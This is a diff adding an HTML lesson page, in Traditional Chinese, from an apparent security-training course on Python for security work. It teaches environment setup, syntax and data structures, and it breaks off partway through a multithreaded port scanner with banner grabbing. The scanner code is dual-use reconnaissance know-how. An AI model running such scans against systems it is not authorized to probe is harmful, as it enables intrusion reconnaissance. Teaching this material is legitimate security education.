@@ -1,0 +1,1532 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Stage 15 — Python 安全開發基礎 | SEC_TRACK</title>
+<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@300;400;500;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#06040f;--bg2:#0a0718;--bg3:#0f0b20;--sur:#16112e;--bdr:#251d45;
+  --acc:#7b68ee;--acc2:#5b48d0;--txt:#d5cfff;--txt2:#6a5faa;--txt3:#372e68;
+  --red:#f05252;--grn:#3ecf8e;--cyn:#22d3ee;--ylw:#fbbf24;--pur:#c084fc;--rose:#fb7185;--org:#f97316;
+}
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{font-family:'Noto Sans TC',sans-serif;background:var(--bg);color:var(--txt);min-height:100vh;}
+body::before{content:'';position:fixed;inset:0;background:
+  radial-gradient(ellipse 60% 40% at 8% 0%,rgba(123,104,238,.06) 0%,transparent 55%),
+  radial-gradient(ellipse 45% 30% at 92% 100%,rgba(91,72,208,.04) 0%,transparent 55%);
+  pointer-events:none;z-index:0;}
+nav{position:fixed;top:0;left:0;right:0;z-index:100;height:60px;display:flex;align-items:center;justify-content:space-between;padding:0 36px;background:rgba(6,4,15,.95);backdrop-filter:blur(14px);border-bottom:1px solid var(--bdr);}
+.n-logo{font-family:'JetBrains Mono',monospace;font-weight:700;font-size:.95rem;color:var(--acc);text-decoration:none;}
+.n-logo span{color:var(--txt3);}
+.n-mid{display:flex;align-items:center;gap:10px;}
+.s-pill{font-family:'JetBrains Mono',monospace;font-size:.62rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;padding:3px 10px;border-radius:20px;background:rgba(123,104,238,.12);color:var(--acc);border:1px solid rgba(123,104,238,.3);}
+.n-sname{font-size:.8rem;color:var(--txt2);}
+.n-back{font-size:.8rem;color:var(--txt3);text-decoration:none;transition:color .2s;}
+.n-back:hover{color:var(--acc);}
+.layout{display:grid;grid-template-columns:280px 1fr;min-height:100vh;padding-top:60px;}
+.sidebar{position:sticky;top:60px;height:calc(100vh - 60px);overflow-y:auto;background:var(--bg2);border-right:1px solid var(--bdr);display:flex;flex-direction:column;z-index:10;}
+.sidebar::-webkit-scrollbar{width:3px;}
+.sidebar::-webkit-scrollbar-thumb{background:var(--bdr);}
+.sb-h{padding:22px 22px 16px;border-bottom:1px solid var(--bdr);flex-shrink:0;}
+.sb-tag{font-family:'JetBrains Mono',monospace;font-size:.6rem;color:var(--acc);letter-spacing:.14em;text-transform:uppercase;margin-bottom:6px;}
+.sb-title{font-size:.88rem;font-weight:700;line-height:1.45;margin-bottom:13px;}
+.sb-meta{display:flex;gap:16px;}
+.sm-item{display:flex;flex-direction:column;gap:2px;}
+.sm-val{font-family:'JetBrains Mono',monospace;font-size:.82rem;font-weight:700;color:var(--acc);}
+.sm-key{font-size:.62rem;color:var(--txt3);letter-spacing:.06em;text-transform:uppercase;}
+.sb-nav{flex:1;overflow-y:auto;padding:6px 0;}
+.ch-btn{width:100%;display:flex;align-items:center;gap:9px;padding:9px 22px;background:none;border:none;border-bottom:1px solid rgba(37,29,69,.7);color:var(--txt2);font-family:'Noto Sans TC',sans-serif;font-size:.79rem;font-weight:500;cursor:pointer;text-align:left;transition:color .18s,background .18s;}
+.ch-btn:hover{color:var(--txt);background:var(--bg3);}
+.ch-btn.cact{color:var(--acc);}
+.ch-num{font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--txt3);min-width:26px;flex-shrink:0;}
+.ch-btn.cact .ch-num{color:var(--acc);}
+.ch-arr{font-size:.52rem;color:var(--txt3);transition:transform .2s;flex-shrink:0;margin-left:auto;}
+.ch-btn.copen .ch-arr{transform:rotate(90deg);}
+.ls-list{display:none;flex-direction:column;background:rgba(0,0,0,.2);}
+.ls-list.lopen{display:flex;}
+.ls-btn{display:flex;align-items:flex-start;gap:9px;padding:7px 22px 7px 44px;background:none;border:none;border-bottom:1px solid rgba(37,29,69,.4);color:var(--txt3);font-family:'Noto Sans TC',sans-serif;font-size:.74rem;cursor:pointer;text-align:left;width:100%;transition:color .18s,background .18s;line-height:1.4;}
+.ls-btn:hover{color:var(--txt2);background:rgba(123,104,238,.04);}
+.ls-btn.lact{color:var(--acc);background:rgba(123,104,238,.08);}
+.ls-dot{width:5px;height:5px;border-radius:50%;background:var(--bdr);flex-shrink:0;margin-top:5px;transition:background .2s;}
+.ls-btn.lact .ls-dot,.ls-btn.ldone .ls-dot{background:var(--acc);}
+.sb-f{padding:13px 22px;border-top:1px solid var(--bdr);flex-shrink:0;}
+.pr{display:flex;justify-content:space-between;font-size:.68rem;color:var(--txt3);margin-bottom:6px;}
+.pt{height:3px;background:var(--bdr);border-radius:2px;overflow:hidden;}
+.pf{height:100%;background:var(--acc);border-radius:2px;transition:width .4s;}
+.main{position:relative;z-index:1;display:flex;flex-direction:column;}
+.lh{padding:38px 56px 30px;border-bottom:1px solid var(--bdr);background:linear-gradient(180deg,rgba(123,104,238,.04) 0%,transparent 100%);}
+.lh-crumb{font-family:'JetBrains Mono',monospace;font-size:.63rem;color:var(--txt3);letter-spacing:.08em;margin-bottom:11px;}
+.lh-crumb em{color:var(--acc);font-style:normal;}
+.lh-title{font-size:1.6rem;font-weight:800;letter-spacing:-.02em;line-height:1.2;margin-bottom:11px;}
+.lh-chips{display:flex;gap:8px;flex-wrap:wrap;}
+.chip{padding:3px 11px;border-radius:20px;font-size:.67rem;font-family:'JetBrains Mono',monospace;letter-spacing:.04em;border:1px solid var(--bdr);color:var(--txt3);}
+.chip.ac{border-color:rgba(123,104,238,.45);color:var(--acc);}
+.cw{padding:38px 56px 80px;max-width:880px;}
+.cb{display:none;}
+.cb.on{display:block;animation:rise .25s ease both;}
+@keyframes rise{from{opacity:0;transform:translateY(7px);}to{opacity:1;transform:none;}}
+h2{font-size:1.25rem;font-weight:800;letter-spacing:-.01em;margin:36px 0 13px;color:var(--txt);display:flex;align-items:center;gap:10px;}
+h2::before{content:'';display:inline-block;width:3px;height:1.1em;border-radius:2px;background:var(--acc);flex-shrink:0;}
+h2:first-child{margin-top:0;}
+h3{font-size:.98rem;font-weight:700;margin:22px 0 9px;color:var(--txt);}
+p{font-size:.9rem;line-height:1.85;color:var(--txt2);margin-bottom:11px;font-weight:300;}
+strong{color:var(--txt);font-weight:600;}
+code{font-family:'JetBrains Mono',monospace;font-size:.8em;background:var(--sur);border:1px solid var(--bdr);padding:1px 6px;border-radius:3px;color:var(--acc);}
+.note{border-left:3px solid;padding:13px 17px;margin:18px 0;border-radius:0 4px 4px 0;}
+.note-lbl{font-family:'JetBrains Mono',monospace;font-size:.58rem;letter-spacing:.12em;text-transform:uppercase;font-weight:700;margin-bottom:6px;}
+.note p{margin:0;font-size:.86rem;line-height:1.7;}
+.note.tip{border-color:var(--acc);background:rgba(123,104,238,.06);}
+.note.tip .note-lbl{color:var(--acc);}
+.note.warn{border-color:var(--ylw);background:rgba(251,191,36,.06);}
+.note.warn .note-lbl{color:var(--ylw);}
+.note.sec{border-color:var(--grn);background:rgba(62,207,142,.06);}
+.note.sec .note-lbl{color:var(--grn);}
+.note.danger{border-color:var(--red);background:rgba(240,82,82,.07);}
+.note.danger .note-lbl{color:var(--red);}
+.note.info{border-color:var(--cyn);background:rgba(34,211,238,.05);}
+.note.info .note-lbl{color:var(--cyn);}
+.cblock{background:#020109;border:1px solid var(--bdr);border-radius:6px;margin:16px 0;overflow:hidden;}
+.ctop{display:flex;align-items:center;justify-content:space-between;padding:7px 15px;background:rgba(10,7,24,.8);border-bottom:1px solid var(--bdr);}
+.clang{font-family:'JetBrains Mono',monospace;font-size:.6rem;color:var(--txt3);letter-spacing:.1em;text-transform:uppercase;}
+.ccopy{font-family:'JetBrains Mono',monospace;font-size:.6rem;color:var(--txt3);background:none;border:none;cursor:pointer;transition:color .2s;}
+.ccopy:hover{color:var(--acc);}
+pre{padding:16px 20px;overflow-x:auto;font-family:'JetBrains Mono',monospace;font-size:.78rem;line-height:1.75;color:#c0b8f0;}
+pre .kw{color:#c792ea;}pre .fn{color:#82aaff;}pre .st{color:#c3e88d;}pre .cm{color:#2a2255;font-style:italic;}
+pre .nu{color:#f78c6c;}pre .hi{color:#7b68ee;font-weight:700;}pre .ok{color:#3ecf8e;}
+pre .bad{color:#f05252;}pre .ylw{color:#fbbf24;}pre .cyn{color:#22d3ee;}
+.tbl{overflow-x:auto;margin:16px 0;}
+table.t{width:100%;border-collapse:collapse;font-size:.82rem;}
+table.t th{background:var(--sur);padding:9px 14px;text-align:left;font-size:.63rem;font-family:'JetBrains Mono',monospace;color:var(--txt3);letter-spacing:.08em;text-transform:uppercase;border:1px solid var(--bdr);}
+table.t td{padding:9px 14px;border:1px solid var(--bdr);color:var(--txt2);font-weight:300;vertical-align:top;line-height:1.55;}
+table.t tr:hover td{background:var(--bg3);}
+.kg{display:grid;grid-template-columns:repeat(2,1fr);gap:2px;background:var(--bdr);border:1px solid var(--bdr);margin:16px 0;}
+.kt{background:var(--bg2);padding:14px 17px;}
+.kt-n{font-family:'JetBrains Mono',monospace;font-size:.75rem;color:var(--acc);font-weight:700;margin-bottom:5px;}
+.kt-d{font-size:.79rem;color:var(--txt2);line-height:1.6;font-weight:300;}
+.ilist{display:flex;flex-direction:column;border:1px solid var(--bdr);border-radius:4px;overflow:hidden;margin:16px 0;}
+.il-item{display:flex;align-items:flex-start;gap:13px;padding:12px 17px;border-bottom:1px solid var(--bdr);transition:background .15s;}
+.il-item:last-child{border-bottom:none;}
+.il-item:hover{background:var(--bg3);}
+.il-num{font-family:'JetBrains Mono',monospace;font-size:.68rem;color:var(--acc);min-width:24px;flex-shrink:0;padding-top:2px;font-weight:700;}
+.il-txt{font-size:.85rem;color:var(--txt2);line-height:1.6;font-weight:300;}
+.il-txt strong{color:var(--txt);}
+.quiz{background:var(--bg3);border:1px solid var(--bdr);border-radius:6px;padding:22px;margin:26px 0;}
+.q-lbl{font-family:'JetBrains Mono',monospace;font-size:.58rem;color:var(--ylw);letter-spacing:.12em;text-transform:uppercase;margin-bottom:10px;}
+.q-q{font-size:.9rem;font-weight:600;margin-bottom:13px;line-height:1.5;color:var(--txt);}
+.q-opts{display:flex;flex-direction:column;gap:6px;}
+.qo{display:flex;align-items:flex-start;gap:10px;padding:8px 13px;border:1px solid var(--bdr);border-radius:4px;cursor:pointer;font-size:.83rem;color:var(--txt2);transition:all .18s;line-height:1.5;}
+.qo:hover{border-color:var(--acc);color:var(--txt);}
+.qo.ok{border-color:var(--acc);background:rgba(123,104,238,.08);color:var(--acc);}
+.qo.bad{border-color:var(--red);background:rgba(240,82,82,.07);color:var(--red);}
+.qo-k{font-family:'JetBrains Mono',monospace;font-size:.68rem;color:var(--txt3);min-width:16px;padding-top:1px;flex-shrink:0;}
+.q-exp{display:none;margin-top:12px;padding:11px 14px;background:rgba(123,104,238,.06);border-left:2px solid var(--acc);border-radius:0 4px 4px 0;font-size:.82rem;color:var(--txt2);line-height:1.65;}
+.q-exp.on{display:block;}
+.done-banner{background:linear-gradient(135deg,rgba(123,104,238,.08),rgba(91,72,208,.05));border:1px solid rgba(123,104,238,.22);border-radius:6px;padding:28px;margin:34px 0 14px;text-align:center;}
+.done-banner h3{font-size:1.1rem;font-weight:800;color:var(--acc);margin-bottom:8px;}
+.done-banner p{font-size:.87rem;margin-bottom:20px;}
+.btn-row{display:flex;gap:11px;justify-content:center;flex-wrap:wrap;}
+.btn-p{display:inline-block;padding:10px 24px;background:var(--acc);color:#06040f;text-decoration:none;font-weight:700;font-size:.84rem;border-radius:4px;transition:all .2s;}
+.btn-p:hover{background:#a090f5;transform:translateY(-1px);}
+.btn-g{display:inline-block;padding:10px 24px;border:1px solid var(--bdr);color:var(--txt2);text-decoration:none;font-size:.84rem;border-radius:4px;transition:all .2s;}
+.btn-g:hover{border-color:var(--acc);color:var(--acc);}
+.lnav{display:flex;justify-content:space-between;align-items:center;padding:22px 56px;border-top:1px solid var(--bdr);background:var(--bg2);position:sticky;bottom:0;z-index:5;}
+.lb{display:flex;align-items:center;gap:7px;padding:8px 18px;border:1px solid var(--bdr);border-radius:4px;background:none;color:var(--txt2);font-size:.82rem;cursor:pointer;font-family:'Noto Sans TC',sans-serif;transition:all .18s;}
+.lb:hover:not(:disabled){border-color:var(--acc);color:var(--acc);}
+.lb.pri{background:var(--acc);color:#06040f;border-color:var(--acc);font-weight:700;}
+.lb.pri:hover:not(:disabled){background:#a090f5;}
+.lb:disabled{opacity:.2;cursor:not-allowed;}
+.ln-mid{text-align:center;}
+.ln-cnt{font-family:'JetBrains Mono',monospace;font-size:.68rem;color:var(--txt3);}
+.ln-sub{font-size:.75rem;color:var(--txt3);margin-top:3px;max-width:260px;}
+@media(max-width:900px){.layout{grid-template-columns:1fr;}.sidebar{position:static;height:auto;}.lh,.cw{padding-left:20px;padding-right:20px;}.lnav{padding:16px 20px;}.kg{grid-template-columns:1fr;}.ln-sub{display:none;}}
+</style>
+</head>
+<body>
+<nav>
+  <a href="index.html" class="n-logo">SEC<span>_</span>TRACK</a>
+  <div class="n-mid"><span class="s-pill">STAGE 15</span><span class="n-sname">Python 安全開發基礎</span></div>
+  <a href="index.html" class="n-back">&#8592; 首頁</a>
+</nav>
+<div class="layout">
+<aside class="sidebar">
+  <div class="sb-h">
+    <div class="sb-tag">STAGE 15 · 3週</div>
+    <div class="sb-title">Python 安全開發基礎<br>從語法到安全應用</div>
+    <div class="sb-meta">
+      <div class="sm-item"><span class="sm-val">5</span><span class="sm-key">章節</span></div>
+      <div class="sm-item"><span class="sm-val">20</span><span class="sm-key">課程</span></div>
+      <div class="sm-item"><span class="sm-val">3週</span><span class="sm-key">時長</span></div>
+    </div>
+  </div>
+  <div class="sb-nav">
+    <div><button class="ch-btn copen cact" onclick="toggleCh(this,'ch1')"><span class="ch-num">CH1</span><span>Python 語言基礎</span><span class="ch-arr">&#9658;</span></button>
+    <div class="ls-list lopen" id="ch1">
+      <button class="ls-btn lact" onclick="go('l1-1',this)"><span class="ls-dot"></span>Python 環境與語法快速入門</button>
+      <button class="ls-btn" onclick="go('l1-2',this)"><span class="ls-dot"></span>數據結構：列表/字典/集合/元組</button>
+      <button class="ls-btn" onclick="go('l1-3',this)"><span class="ls-dot"></span>函數、模組與異常處理</button>
+      <button class="ls-btn" onclick="go('l1-4',this)"><span class="ls-dot"></span>正規表達式與文字處理</button>
+    </div></div>
+    <div><button class="ch-btn" onclick="toggleCh(this,'ch2')"><span class="ch-num">CH2</span><span>網路與系統編程</span><span class="ch-arr">&#9658;</span></button>
+    <div class="ls-list" id="ch2">
+      <button class="ls-btn" onclick="go('l2-1',this)"><span class="ls-dot"></span>Socket 網路編程基礎</button>
+      <button class="ls-btn" onclick="go('l2-2',this)"><span class="ls-dot"></span>多執行緒與非同步 IO</button>
+      <button class="ls-btn" onclick="go('l2-3',this)"><span class="ls-dot"></span>系統與進程操作（os/subprocess）</button>
+      <button class="ls-btn" onclick="go('l2-4',this)"><span class="ls-dot"></span>資料庫操作：SQLite / MySQL</button>
+    </div></div>
+    <div><button class="ch-btn" onclick="toggleCh(this,'ch3')"><span class="ch-num">CH3</span><span>Web 開發與爬蟲</span><span class="ch-arr">&#9658;</span></button>
+    <div class="ls-list" id="ch3">
+      <button class="ls-btn" onclick="go('l3-1',this)"><span class="ls-dot"></span>HTTP 協議與 requests 庫實戰</button>
+      <button class="ls-btn" onclick="go('l3-2',this)"><span class="ls-dot"></span>BeautifulSoup / lxml 爬蟲解析</button>
+      <button class="ls-btn" onclick="go('l3-3',this)"><span class="ls-dot"></span>Flask Web 框架入門</button>
+      <button class="ls-btn" onclick="go('l3-4',this)"><span class="ls-dot"></span>Selenium 動態頁面爬取</button>
+    </div></div>
+    <div><button class="ch-btn" onclick="toggleCh(this,'ch4')"><span class="ch-num">CH4</span><span>安全工具開發</span><span class="ch-arr">&#9658;</span></button>
+    <div class="ls-list" id="ch4">
+      <button class="ls-btn" onclick="go('l4-1',this)"><span class="ls-dot"></span>端口掃描器開發</button>
+      <button class="ls-btn" onclick="go('l4-2',this)"><span class="ls-dot"></span>密碼與哈希工具開發</button>
+      <button class="ls-btn" onclick="go('l4-3',this)"><span class="ls-dot"></span>日誌分析自動化腳本</button>
+      <button class="ls-btn" onclick="go('l4-4',this)"><span class="ls-dot"></span>漏洞 PoC 開發與利用框架</button>
+    </div></div>
+    <div><button class="ch-btn" onclick="toggleCh(this,'ch5')"><span class="ch-num">CH5</span><span>安全編碼與防禦</span><span class="ch-arr">&#9658;</span></button>
+    <div class="ls-list" id="ch5">
+      <button class="ls-btn" onclick="go('l5-1',this)"><span class="ls-dot"></span>Python 安全編碼規範</button>
+      <button class="ls-btn" onclick="go('l5-2',this)"><span class="ls-dot"></span>輸入驗證與 SQL 注入防護</button>
+      <button class="ls-btn" onclick="go('l5-3',this)"><span class="ls-dot"></span>加密與安全通訊實作</button>
+      <button class="ls-btn" onclick="go('l5-4',this)"><span class="ls-dot"></span>靜態代碼分析與 CI/CD 整合</button>
+    </div></div>
+  </div>
+  <div class="sb-f">
+    <div class="pr"><span>學習進度</span><span id="pct">0%</span></div>
+    <div class="pt"><div class="pf" id="pf" style="width:0%"></div></div>
+  </div>
+</aside>
+<main class="main">
+  <div class="lh">
+    <div class="lh-crumb" id="crumb">STAGE 15 &gt; CH1 &gt; <em>課程 1</em></div>
+    <h1 class="lh-title" id="ltitle">Python 環境與語法快速入門</h1>
+    <div class="lh-chips">
+      <span class="chip ac" id="chip1">Python 基礎</span>
+      <span class="chip" id="chip2">25 分鐘</span>
+    </div>
+  </div>
+  <div class="cw">
+<!-- CH1 -->
+<div class="cb on" id="l1-1">
+<h2>Python 環境與語法快速入門</h2>
+<p>Python 是安全工程師最常用的腳本語言，廣泛應用於自動化測試、漏洞驗證、日誌分析、安全工具開發。它語法簡潔、生態豐富（pip 倉庫超過 50 萬個套件），非常適合快速原型開發。</p>
+<h3>環境搭建</h3>
+<div class="cblock"><div class="ctop"><span class="clang">Python 環境安裝與驗證</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+<pre><span class="cm"># ─── Linux / macOS ───</span>
+python3 --version                 <span class="cm"># 確認已安裝（推薦 3.10+）</span>
+pip3 install --upgrade pip        <span class="cm"># 升級包管理器</span>
+
+<span class="cm"># 虛擬環境（強烈推薦：隔離項目依賴）</span>
+python3 -m venv .venv             <span class="cm"># 建立虛擬環境</span>
+source .venv/bin/activate         <span class="cm"># 啟動（Windows：.venv\Scripts\activate）</span>
+pip install requests beautifulsoup4 flask  <span class="cm"># 安裝常用安全庫</span>
+pip freeze > requirements.txt     <span class="cm"># 記錄依賴（便於複現環境）</span>
+deactivate                        <span class="cm"># 退出虛擬環境</span>
+
+<span class="cm"># ─── 安全工具常用套件 ───</span>
+pip install requests              <span class="cm"># HTTP 客戶端（爬蟲/API 測試）</span>
+pip install scapy                 <span class="cm"># 網路封包構造與分析</span>
+pip install cryptography          <span class="cm"># 現代加解密（推薦替代 PyCrypto）</span>
+pip install paramiko              <span class="cm"># SSH 連線自動化</span>
+pip install pwntools               <span class="cm"># CTF/漏洞利用框架</span>
+pip install sqlmap                <span class="cm"># （命令行工具，非庫）SQL 注入掃描</span></pre>
+</div>
+<h3>Python 語法核心精要</h3>
+<div class="cblock"><div class="ctop"><span class="clang">Python 語法快速參考</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+<pre><span class="cm"># ─── 變量與類型 ───</span>
+name = <span class="st">"Alice"</span>           <span class="cm"># str（字符串）</span>
+port = <span class="nu">8080</span>              <span class="cm"># int（整數）</span>
+is_open = <span class="kw">True</span>           <span class="cm"># bool</span>
+ip_list = [<span class="st">"10.0.0.1"</span>, <span class="st">"10.0.0.2"</span>]   <span class="cm"># list（可變序列）</span>
+headers = {<span class="st">"User-Agent"</span>: <span class="st">"Mozilla/5.0"</span>}  <span class="cm"># dict（鍵值對）</span>
+ports = {<span class="nu">22</span>, <span class="nu">80</span>, <span class="nu">443</span>}    <span class="cm"># set（唯一元素集合）</span>
+coord = (<span class="nu">10.5</span>, <span class="nu">3.2</span>)      <span class="cm"># tuple（不可變序列）</span>
+
+<span class="cm"># ─── 條件與循環 ───</span>
+<span class="kw">if</span> port == <span class="nu">443</span>:
+    <span class="fn">print</span>(<span class="st">"HTTPS"</span>)
+<span class="kw">elif</span> port == <span class="nu">80</span>:
+    <span class="fn">print</span>(<span class="st">"HTTP"</span>)
+<span class="kw">else</span>:
+    <span class="fn">print</span>(<span class="st">f"Unknown port: {port}"</span>)   <span class="cm"># f-string 格式化（Python 3.6+）</span>
+
+<span class="kw">for</span> ip <span class="kw">in</span> ip_list:
+    <span class="fn">print</span>(<span class="st">f"Scanning {ip}"</span>)
+
+<span class="cm"># 列表推導式（List Comprehension）— Python 精華</span>
+open_ports = [p <span class="kw">for</span> p <span class="kw">in</span> range(<span class="nu">1</span>, <span class="nu">1025</span>) <span class="kw">if</span> p % <span class="nu">2</span> == <span class="nu">0</span>]
+
+<span class="cm"># ─── 函數定義 ───</span>
+<span class="kw">def</span> <span class="fn">check_port</span>(host: str, port: int, timeout: float = <span class="nu">1.0</span>) -> bool:
+    <span class="st">"""檢查主機端口是否開放"""</span>
+    <span class="kw">import</span> socket
+    <span class="kw">try</span>:
+        s = socket.socket()
+        s.settimeout(timeout)
+        s.connect((host, port))
+        s.close()
+        <span class="kw">return</span> <span class="kw">True</span>
+    <span class="kw">except</span> (socket.timeout, ConnectionRefusedError):
+        <span class="kw">return</span> <span class="kw">False</span>
+
+<span class="cm"># 調用</span>
+result = <span class="fn">check_port</span>(<span class="st">"192.168.1.1"</span>, <span class="nu">22</span>)
+<span class="fn">print</span>(<span class="st">"SSH Open:"</span>, result)</pre>
+</div>
+<div class="note tip"><div class="note-lbl">Python 版本選擇</div><p>始終使用 <strong>Python 3.10+</strong>，Python 2 已於 2020 年停止維護且存在多個安全漏洞。在安全工具開發中，注意區分 <code>str</code>（文字字符串）和 <code>bytes</code>（二進制數據）——網路編程中的 socket 收發的是 bytes，需要 <code>.encode()</code> / <code>.decode()</code> 互轉。</p></div>
+</div>
+
+<div class="cb" id="l1-2">
+<h2>數據結構：列表 / 字典 / 集合 / 元組</h2>
+<p>Python 的四種核心數據結構是安全工具開發的基礎。在分析掃描結果、處理 IP 列表、存儲漏洞信息時，選擇正確的數據結構直接影響代碼效率和可讀性。</p>
+<div class="tbl"><table class="t"><thead><tr><th>數據結構</th><th>特性</th><th>安全場景</th><th>常用操作</th></tr></thead><tbody>
+<tr><td><strong>list 列表</strong></td><td>有序、可變、允許重複</td><td>存儲掃描到的開放端口列表、IP 範圍、漏洞列表</td><td><code>append()</code> <code>extend()</code> <code>sort()</code> <code>pop()</code></td></tr>
+<tr><td><strong>dict 字典</strong></td><td>鍵值對、查找 O(1)</td><td>存儲主機→端口映射、CVE→描述、Header 鍵值對</td><td><code>get()</code> <code>items()</code> <code>keys()</code> <code>update()</code></td></tr>
+<tr><td><strong>set 集合</strong></td><td>無序、唯一、查找 O(1)</td><td>去重 IP 列表、已掃描目標記錄、關鍵字黑名單</td><td><code>add()</code> <code>union()</code> <code>intersection()</code> <code>in</code></td></tr>
+<tr><td><strong>tuple 元組</strong></td><td>有序、不可變</td><td>存儲（host, port）配對、函數多返回值、字典的 key</td><td><code>index()</code> <code>count()</code> 解包</td></tr>
+</tbody></table></div>
+<div class="cblock"><div class="ctop"><span class="clang">數據結構在安全工具中的實際應用</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+<pre><span class="cm"># ─── 列表：存儲和處理掃描結果 ───</span>
+open_ports = []
+<span class="kw">for</span> port <span class="kw">in</span> [<span class="nu">21</span>,<span class="nu">22</span>,<span class="nu">80</span>,<span class="nu">443</span>,<span class="nu">3306</span>]:
+    <span class="kw">if</span> <span class="fn">check_port</span>(<span class="st">"192.168.1.1"</span>, port):
+        open_ports.append(port)
+open_ports.sort()
+<span class="fn">print</span>(<span class="st">f"開放端口: {open_ports}"</span>)  <span class="cm"># [22, 80, 443]</span>
+
+<span class="cm"># ─── 字典：構建主機掃描報告 ───</span>
+scan_result = {
+    <span class="st">"192.168.1.1"</span>: {<span class="st">"ports"</span>: [<span class="nu">22</span>, <span class="nu">80</span>], <span class="st">"os"</span>: <span class="st">"Linux"</span>, <span class="st">"risk"</span>: <span class="st">"High"</span>},
+    <span class="st">"192.168.1.2"</span>: {<span class="st">"ports"</span>: [<span class="nu">3306</span>], <span class="st">"os"</span>: <span class="st">"Unknown"</span>, <span class="st">"risk"</span>: <span class="st">"Critical"</span>},
+}
+<span class="kw">for</span> ip, info <span class="kw">in</span> scan_result.items():
+    <span class="fn">print</span>(<span class="st">f"{ip}: {info['risk']} - 開放 {info['ports']}"</span>)
+
+<span class="cm"># 安全讀取（避免 KeyError）</span>
+os_type = scan_result.get(<span class="st">"192.168.1.99"</span>, {}).get(<span class="st">"os"</span>, <span class="st">"Unknown"</span>)
+
+<span class="cm"># ─── 集合：高效去重與差異對比 ───</span>
+last_week_ips = {<span class="st">"10.0.0.1"</span>, <span class="st">"10.0.0.2"</span>, <span class="st">"10.0.0.3"</span>}
+this_week_ips = {<span class="st">"10.0.0.1"</span>, <span class="st">"10.0.0.2"</span>, <span class="st">"10.0.0.5"</span>}
+
+new_ips = this_week_ips - last_week_ips      <span class="cm"># 新出現：{'10.0.0.5'}</span>
+gone_ips = last_week_ips - this_week_ips     <span class="cm"># 消失：{'10.0.0.3'}</span>
+<span class="fn">print</span>(<span class="st">f"新增資產: {new_ips}"</span>)
+<span class="fn">print</span>(<span class="st">f"下線資產: {gone_ips}"</span>)
+
+<span class="cm"># ─── 元組：Socket 地址對 ───</span>
+targets = [(<span class="st">"192.168.1.1"</span>, <span class="nu">22</span>), (<span class="st">"192.168.1.2"</span>, <span class="nu">80</span>)]
+<span class="kw">for</span> host, port <span class="kw">in</span> targets:       <span class="cm"># 元組解包</span>
+    <span class="fn">print</span>(<span class="st">f"Connecting {host}:{port}"</span>)</pre>
+</div>
+</div>
+
+<div class="cb" id="l1-3">
+<h2>函數、模組與異常處理</h2>
+<p>在安全工具開發中，良好的函數設計讓代碼可以被複用和測試。模組化組織避免代碼膨脹，而健壯的異常處理讓工具在面對不可預期的目標時不會直接崩潰。</p>
+<div class="cblock"><div class="ctop"><span class="clang">模組化安全工具設計</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+<pre><span class="cm"># ─── 文件結構建議 ───</span>
+<span class="cm"># scanner/
+# ├── __init__.py
+# ├── port_scanner.py    # 端口掃描模組
+# ├── http_probe.py      # HTTP 探測模組
+# ├── report.py          # 報告生成模組
+# └── main.py            # 入口</span>
+
+<span class="cm"># port_scanner.py — 模組示例</span>
+<span class="kw">import</span> socket
+<span class="kw">import</span> concurrent.futures
+<span class="kw">from</span> typing <span class="kw">import</span> List, Tuple
+
+COMMON_PORTS = [<span class="nu">21</span>,<span class="nu">22</span>,<span class="nu">23</span>,<span class="nu">25</span>,<span class="nu">53</span>,<span class="nu">80</span>,<span class="nu">110</span>,<span class="nu">143</span>,<span class="nu">443</span>,<span class="nu">445</span>,
+                <span class="nu">3306</span>,<span class="nu">3389</span>,<span class="nu">5432</span>,<span class="nu">6379</span>,<span class="nu">8080</span>,<span class="nu">8443</span>,<span class="nu">27017</span>]
+
+<span class="kw">def</span> <span class="fn">scan_port</span>(target: Tuple[str, int], timeout: float = <span class="nu">1.0</span>) -> Tuple[int, bool, str]:
+    <span class="st">"""掃描單個端口，返回 (port, is_open, banner)"""</span>
+    host, port = target
+    <span class="kw">try</span>:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        result = s.connect_ex((host, port))   <span class="cm"># 0 = 成功連接</span>
+        banner = <span class="st">""</span>
+        <span class="kw">if</span> result == <span class="nu">0</span>:
+            <span class="kw">try</span>:
+                s.send(<span class="st">b"HEAD / HTTP/1.0\r\n\r\n"</span>)
+                banner = s.recv(<span class="nu">256</span>).decode(<span class="st">"utf-8"</span>, errors=<span class="st">"ignore"</span>).split(<span class="st">"\n"</span>)[<span class="nu">0</span>]
+            <span class="kw">except</span>:
+                <span class="kw">pass</span>
+        s.close()
+        <span class="kw">return</span> port, result == <span class="nu">0</span>, banner
+    <span class="kw">except</span> Exception <span class="kw">as</span> e:
+        <span class="kw">return</span> port, <span class="kw">False</span>, <span class="fn">str</span>(e)
+
+<span class="kw">def</span> <span class="fn">scan_host</span>(host: str, ports: List[int] = <span class="kw">None</span>, workers: int = <span class="nu">50</span>) -> dict:
+    <span class="st">"""多執行緒掃描主機多個端口"""</span>
+    <span class="kw">if</span> ports <span class="kw">is</span> <span class="kw">None</span>:
+        ports = COMMON_PORTS
+    targets = [(host, p) <span class="kw">for</span> p <span class="kw">in</span> ports]
+    results = {}
+    <span class="kw">with</span> concurrent.futures.ThreadPoolExecutor(max_workers=workers) <span class="kw">as</span> ex:
+        futures = {ex.submit(<span class="fn">scan_port</span>, t): t <span class="kw">for</span> t <span class="kw">in</span> targets}
+        <span class="kw">for</span> future <span class="kw">in</span> concurrent.futures.as_completed(futures):
+            port, is_open, banner = future.result()
+            <span class="kw">if</span> is_open:
+                results[port] = {<span class="st">"open"</span>: <span class="kw">True</span>, <span class="st">"banner"</span>: banner}
+    <span class="kw">return</span> results
+
+<span class="cm"># main.py — 入口</span>
+<span class="kw">if</span> __name__ == <span class="st">"__main__"</span>:
+    <span class="kw">import</span> sys
